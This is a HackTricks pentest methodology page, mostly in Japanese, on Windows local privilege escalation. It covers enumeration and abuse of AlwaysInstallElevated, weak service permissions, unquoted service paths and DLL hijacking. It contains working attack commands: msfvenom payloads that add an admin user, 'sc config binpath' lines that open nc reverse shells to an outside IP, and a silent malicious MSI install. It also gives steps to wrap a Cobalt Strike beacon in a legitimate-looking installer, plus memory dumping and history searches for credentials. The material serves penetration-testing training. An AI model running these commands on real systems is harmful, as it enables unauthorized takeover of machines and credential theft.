# Windowsローカル特権昇格

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけます
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れます
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

### **Windowsローカル特権昇格ベクターを探すための最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初期のWindows理論

### アクセス トークン

**Windowsアクセス トークンが何かわからない場合は、続行する前に次のページを読んでください:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEsに関する詳細情報については、次のページを確認してください:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### 完全性レベル

**Windowsの完全性レベルがわからない場合は、続行する前に次のページを読んでください:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windowsセキュリティコントロール

Windowsには、**システムの列挙を防ぐ**、実行可能ファイルを実行したり、**活動を検出する**ことができるさまざまな要素があります。特権昇格の列挙を開始する前に、次の**ページ**を**読んで**これらの**防御メカニズム**をすべて**列挙**してください:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## システム情報

### バージョン情報の列挙

Windowsバージョンに既知の脆弱性があるかどうかを確認します（適用されたパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンの脆弱性

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700以上のセキュリティ脆弱性があり、Windows環境が提示する**膨大な攻撃面**が示されています。

**システム上**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにwatsonが組み込まれています)_

**システム情報を使用してローカルで**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitのGithubリポジトリ:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存された資格情報/重要情報はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

これを有効にする方法については、[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で学ぶことができます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShellモジュールのロギング

PowerShellパイプラインの実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、完全な実行の詳細と出力結果がキャプチャされない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**の代わりに**「モジュールのロギング」**を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
最後の15件のPowersShellログを表示するには、次のコマンドを実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **スクリプトブロックのロギング**

スクリプトの実行の完全なアクティビティと内容の記録がキャプチャされ、コードの各ブロックが実行されるたびにドキュメント化されます。このプロセスにより、各アクティビティの包括的な監査トレイルが保存され、フォレンジックや悪意のある動作の分析に役立ちます。実行時にすべてのアクティビティを文書化することで、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
スクリプトブロックのログイベントは、Windowsイベントビューアー内のパスで見つけることができます: **アプリケーションとサービスのログ > Microsoft > Windows > PowerShell > Operational**。\
最後の20イベントを表示するには次を使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

システムがhttp**S**ではなくhttpを使用して更新を要求していない場合、システムを侵害することができます。

次のコマンドを実行して、ネットワークが非SSL WSUS更新を使用しているかどうかを確認できます。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
もし次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit ペイロード
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
### PowerUP

メータプリターセッションがある場合、モジュール**`exploit/windows/local/always_install_elevated`**を使用してこのテクニックを自動化できます。

PowerUPを使用して、特権を昇格させるために現在のディレクトリ内にWindows MSIバイナリを作成するために`Write-UserAddMSI`コマンドを使用します。このスクリプトは、ユーザー/グループの追加を求める事前にコンパイルされたMSIインストーラを書き出します（したがって、GUIアクセスが必要です）。
```
Write-UserAddMSI
```
### 作成したバイナリを実行して特権を昇格させます。

### MSIラッパー

このツールを使用してMSIラッパーを作成する方法について学ぶために、このチュートリアルを読んでください。**コマンドラインを実行**したい場合は、"**.bat**"ファイルをラップできることに注意してください。

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIXを使用したMSIの作成

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studioを使用したMSIの作成

* Cobalt StrikeまたはMetasploitで`C:\privesc\beacon.exe`に**新しいWindows EXE TCPペイロード**を生成します。
* **Visual Studio**を開き、**新しいプロジェクトを作成**を選択し、検索ボックスに "installer" と入力します。**Setup Wizard**プロジェクトを選択して**次へ**をクリックします。
* プロジェクトに名前を付け、**AlwaysPrivesc**のような名前を使用し、場所に**`C:\privesc`**を選択し、**ソリューションとプロジェクトを同じディレクトリに配置**を選択し、**作成**をクリックします。
* **次へ**をクリックし続け、ステップ 3/4（含めるファイルを選択）に到達します。**追加**をクリックし、さきほど生成したBeaconペイロードを選択します。その後、**完了**をクリックします。
* **ソリューションエクスプローラ**で**AlwaysPrivesc**プロジェクトを強調表示し、**プロパティ**で**TargetPlatform**を**x86**から**x64**に変更します。
* インストールされたアプリをより合法的に見せることができる**Author**や**Manufacturer**など、他のプロパティを変更できます。
* プロジェクトを右クリックし、**表示 > カスタムアクション**を選択します。
* **インストール**を右クリックし、**カスタムアクションの追加**を選択します。
* **Application Folder**をダブルクリックし、**beacon.exe**ファイルを選択して**OK**をクリックします。これにより、インストーラが実行されるとすぐにBeaconペイロードが実行されるようになります。
* **カスタムアクションのプロパティ**で、**Run64Bit**を**True**に変更します。
* 最後に、**ビルド**します。
* `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`という警告が表示される場合は、プラットフォームをx64に設定していることを確認してください。

### MSIのインストール

悪意のある`.msi`ファイルの**インストール**を**バックグラウンド**で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
## 特権昇格

この脆弱性を悪用するには、_exploit/windows/local/always\_install\_elevated_ を使用できます。

## アンチウイルスおよび検出器

### 監査設定

これらの設定は何が**記録**されるかを決定するため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding（Windows イベント転送）は、ログがどこに送信されているかを知るために興味深いです。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**は、ドメインに参加しているコンピュータ上の**ローカル管理者パスワードの管理**を目的としており、各パスワードが**一意でランダム化され、定期的に更新**されることを保証します。これらのパスワードはActive Directory内で安全に保存され、ACLを介して十分な権限が付与されたユーザーのみがアクセスでき、認可された場合にのみローカル管理者パスワードを表示できます。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

**WDigest**が有効な場合、**平文パスワードがLSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**WDigestに関する詳細情報はこのページを参照**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**からはじめて、Microsoftはローカルセキュリティ機関（LSA）のメモリを読み取ろうとする信頼されていないプロセスの試みやコードのインジェクションをブロックするために、強化された保護を導入し、システムをさらにセキュアにしました。\
[**LSA Protectionに関する詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### 資格情報ガード

**資格情報ガード**は**Windows 10**に導入されました。その目的は、デバイスに保存されている資格情報をハッシュの盗用攻撃などの脅威から保護することです。[**資格情報ガードに関する詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報**は**ローカルセキュリティ機関**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常、ユーザーのためのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報に関する詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザー＆グループ

### ユーザー＆グループの列挙

興味深い権限を持つ可能性のあるグループがあるかどうかを確認する必要があります
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループに所属している場合、特権を昇格させることができる可能性があります**。特権グループについて学び、特権昇格に悪用する方法についてはこちらを参照してください：

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### トークン操作

**トークン**とは何かについて詳しく学ぶには、このページを参照してください：[**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
興味深いトークンについて学び、それらを悪用する方法については、以下のページをチェックしてください：

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### ログインユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得します
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルおよびフォルダのアクセス権限

まず、プロセスをリストアップして、**プロセスのコマンドライン内にパスワードが含まれていないか**を確認します。\
実行中のバイナリを**上書きできるか**、またはバイナリフォルダに書き込み権限があるかどうかをチェックして、可能な[**DLLハイジャック攻撃**](dll-hijacking/)を悪用できるかどうかを確認します。
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の[**electron/cef/chromium debuggers**を確認し、特権を昇格させるために悪用できる可能性があるかどうかを確認してください](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリの権限をチェックする**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリフォルダーのアクセス許可をチェックする（**[**DLLハイジャッキング**](dll-hijacking/)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリーパスワードマイニング

**Sysinternals** の **procdump** を使用して実行中のプロセスのメモリーダンプを作成できます。FTPのようなサービスでは、**メモリー内に平文で資格情報が保存**されていることがあります。メモリーダンプを作成して資格情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### セキュリティの脆弱なGUIアプリ

**SYSTEMとして実行されているアプリケーションは、ユーザーがCMDを生成したり、ディレクトリを参照したりすることを許可するかもしれません。**

例: "Windowsヘルプとサポート" (Windows + F1)、"コマンドプロンプト"を検索し、"クリックしてコマンドプロンプトを開く"をクリックします。

## サービス

サービスのリストを取得します:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc**を使用してサービスの情報を取得できます。
```bash
sc qc <service_name>
```
以下は、_Sysinternals_ から **accesschk** というバイナリを使用して、各サービスの必要な特権レベルをチェックすることが推奨されています。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
次の手順を実行して、"Authenticated Users" がどのサービスでも変更できるかどうかを確認することをお勧めします:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用のaccesschk.exeをこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスの有効化

このエラーが発生している場合（たとえばSSDPSRVの場合）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次の方法で有効化できます:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービスupnphostは、動作するためにSSDPSRVに依存していることに注意してください（XP SP1の場合）**

**この問題の別の回避策**は、次のコマンドを実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

"認証済みユーザー"グループがサービスに対して**SERVICE\_ALL\_ACCESS**を所有している場合、サービスの実行可能バイナリを変更することが可能です。**sc**を変更して実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
特権はさまざまな権限を通じて昇格できます：

- **SERVICE\_CHANGE\_CONFIG**：サービスバイナリの再構成を許可します。
- **WRITE\_DAC**：権限の再構成を可能にし、サービス構成の変更ができるようになります。
- **WRITE\_OWNER**：所有権の取得と権限の再構成を許可します。
- **GENERIC\_WRITE**：サービス構成の変更ができる能力を継承します。
- **GENERIC\_ALL**：サービス構成の変更ができる能力を継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service\_permissions_ を利用できます。

### サービスバイナリの権限が弱い

**サービスによって実行されるバイナリを変更できるかどうか**、またはバイナリが配置されているフォルダに**書き込み権限があるかどうか**を確認してください（[**DLL Hijacking**](dll-hijacking/)）。\
**wmic**（system32 以外）を使用してサービスによって実行されるすべてのバイナリを取得し、**icacls** を使用して権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
あなたは**sc**と**icacls**も使用することができます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

サービスレジストリを変更できるかどうかを確認する必要があります。\
次のようにして、サービスレジストリに対する権限を確認できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
次のことを確認する必要があります。**Authenticated Users**または**NT AUTHORITY\INTERACTIVE**が`FullControl`権限を持っているかどうか。もしそうなら、サービスによって実行されるバイナリを変更できます。

実行されるバイナリのパスを変更するには：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### サービスレジストリのAppendData/AddSubdirectory権限

レジストリにこの権限がある場合、**このレジストリからサブレジストリを作成できます**。Windowsサービスの場合、これは**任意のコードを実行するのに十分です**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### 引用符のないサービスパス

実行可能ファイルへのパスが引用符で囲まれていない場合、Windowsはスペースの前のすべての終了を実行しようとします。

たとえば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは次のように実行しようとします:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
以下は、組み込みのWindowsサービスに属さないすべての引用符のないサービスパスのリストです：
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性を検出して悪用**するには、metasploitを使用できます：`exploit/windows/local/trusted\_service\_path` 手動でmetasploitを使用してサービスバイナリを作成することもできます：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### リカバリーアクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能はバイナリを指すように構成できます。このバイナリが置換可能であれば、特権昇格が可能になるかもしれません。詳細は[公式ドキュメント](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN)に記載されています。

## アプリケーション

### インストールされたアプリケーション

**バイナリのアクセス権**（上書きして特権昇格を行うことができるかもしれません）と**フォルダー**のアクセス権（[DLLハイジャッキング](dll-hijacking/)）を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

システム内の弱いフォルダ/ファイルの権限を見つける方法は次のとおりです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### スタートアップで実行

**異なるユーザーによって実行されるレジストリまたはバイナリを上書きできるかどうかを確認します。**\
**次のページ**を**読んで**特権を昇格させるための興味深い**autorunsの場所**について詳しく知る：

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ドライバー

可能な**サードパーティーの奇妙で脆弱な**ドライバーを探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL ハイジャッキング

もし、**PATH に存在するフォルダ内に書き込み権限**がある場合、プロセスによって読み込まれる DLL をハイジャックして**特権を昇格**することができるかもしれません。

PATH 内のすべてのフォルダの権限をチェックします：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
以下は、このチェックを悪用する方法の詳細についての情報です：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### ホストファイル

ホストファイルにハードコードされた他の既知のコンピュータをチェックします
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース＆DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### オープンポート

外部からの**制限されたサービス**をチェックします
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
